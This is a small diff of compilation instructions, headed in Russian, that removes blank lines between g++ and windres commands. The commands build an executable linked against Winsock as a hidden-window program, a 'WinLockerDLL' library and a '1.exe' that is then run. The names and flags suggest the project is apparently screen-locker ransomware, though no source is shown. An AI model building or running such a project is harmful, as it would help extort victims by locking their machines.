@@ -14,21 +14,14 @@
 Компиляция:
 
 g++ -o kostikmakostik.exe kostikmakostik.cpp -lws2_32 -mwindows -DUNICODE -D_UNICODE
-
 PAUSE
-
 
 windres WinLockerDLL.rc -o WinLockerDLL.o
-
 PAUSE
-
 g++ -shared -o WinLockerDLL.dll WinLockerDLL.cpp WinLockerDLL.o -lws2_32 -luser32 -lgdi32 -Wl,--subsystem,windows -DUNICODE -D_UNICODE
-
 PAUSE
 
 
 g++ -DUNICODE -D_UNICODE -DWIN32 -D_WINDOWS -o 1.exe 1.cpp -mwindows
-
 1.exe
-
 PAUSE
